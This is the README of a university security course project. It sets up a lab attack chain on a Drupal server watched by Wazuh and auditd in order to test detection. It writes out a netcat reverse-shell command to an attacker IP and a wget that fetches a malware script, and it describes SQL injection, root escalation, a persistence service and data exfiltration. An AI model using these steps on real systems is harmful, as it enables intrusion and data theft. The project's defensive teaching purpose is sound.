# CS668A: Practical Cyber Security For Cyber Practitioners Hawkeye Final Project

Directory Structure:
```
    ├── CS668A_Hawkeye_Group_Project_demo.mp4          # Demo video for final project
    ├── OS-Vulnerability                               # OS-Vulnerability script executes and gives the root access
    ├── README.md                                      # Readme file
    ├── audit_mitre.rules                              # auditd rule mapped with mitre attack matrix
    ├── createUser.py                                  # For SQL injection attack
    ├── presentation.pptx                              # Presentation for final project
    └── systemd1.sh                                    # Malicious script to create persistence as a service in the machine and 
                                                         exfilterate the data from the victim machine
```

> To setup the entire project please follow the steps mentioned as follows:

## Setup Victim Machine (Ubuntu 20.04)

1. The first step is to setup the drupal website and create a login page using the [link](https://www.tecmint.com/install-drupal-in-ubuntu-debian/).
2. Install the shell client module in the drupal CMS. Shell client module for drupal can be found [here](https://www.drupal.org/project/shell_client) and new module installation process is shown in the [link](https://www.drupal.org/docs/user_guide/en/extend-module-install.html).
3. Install Wazuh server using [Link](https://computingforgeeks.com/how-to-install-wazuh-server-on-ubuntu/) and set up linux agent on the victim machine using [Link](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html)
4. Install auditd on victim machine 
 ```sh
 sudo apt update
 sudo apt-get install auditd
 systemctl status auditd
 systemctl enable auditd
 systemctl start auditd
 ```
 5. Place the `audit_mitre.rules` file provided in this repository in the directory `/etc/audit/rules.d/` 
 6. Step 3 and 4 help the victim machine to monitor the security logs.
 
## Setup Attacker Machine (Kali OS)
Open three terminals or use `tmux` to split the terminal in three parts and execute the following commands:
```sh
* Terminal 1:
python3 -m pip install --user uploadserver
# for upload server where the attacker collect the data from the victim
python3 -m uploadserver 8002

* Terminal 2:
# For downloading the malware to victim
python3 -m http.server 8001

* Terminal 3:
# for reverse shell from victim
nc.traditional -lvp 8080
```

> After setting up the infrastructure, we can attack the victim machine and check the open-source tools' efficacy.
> To perform the attack scenario follow the mentioned steps:

### Steps to follow on Victim machine
```
* Initially host the vulnerable website having the shell client enabled on the victim machine.
* Restart all the system monitoring services like wazuh and auditd for security monitoring on the host.
* For real time monitoring of attacks execute below command for auditd
```
```sh
    tail -f /var/log/audit/audit.log | awk '/key/ {print $25,$26,$28}'
```
### Screenshot for the wazuh and auditd monitoring
![log monitoring](https://github.com/nkcool5/CS668A_Hawkeye/blob/main/Screenshot%20(1).png?raw=true)

### Steps to follow on attacker machine
```
* Perform nmap on the hosted website.
* check for open port for example 80 for webserver
* open browser and visit the website hosted 
* Perform the sql injection attack using `createUser.py` script. This script will take hosted website URL, username, password as a input for creating the admin user using SQL injection attack.
* After successful login, you can access the shell through the browser and execute the below command to get reverse shell of the victim machine.
```
```sh
nc.traditional 192.168.56.1 8080 -e "/bin/bash"
```
```
* Now we have access to the victim machine we can execute the `OS-Vulnerability` to get the root access.
* After getting the root access we create a hidden directory (.tmp) for defence evasion in home directory.
* Download the malware from the attacker's machine to victim machine using command below
```
```sh
wget http://<ip-address-of-attacker>:8001/systemd1.sh
```
```
* After downloading the malware attacker will execute the malware. Malware creates a service for persistence and exfiltrate the data from the victim machine.
```
### A few screenshots from the attackers machine compromising the victim

![attack](https://github.com/nkcool5/CS668A_Hawkeye/blob/main/attack.png?raw=true)
![attack1](https://github.com/nkcool5/CS668A_Hawkeye/blob/main/shell.png?raw=true)


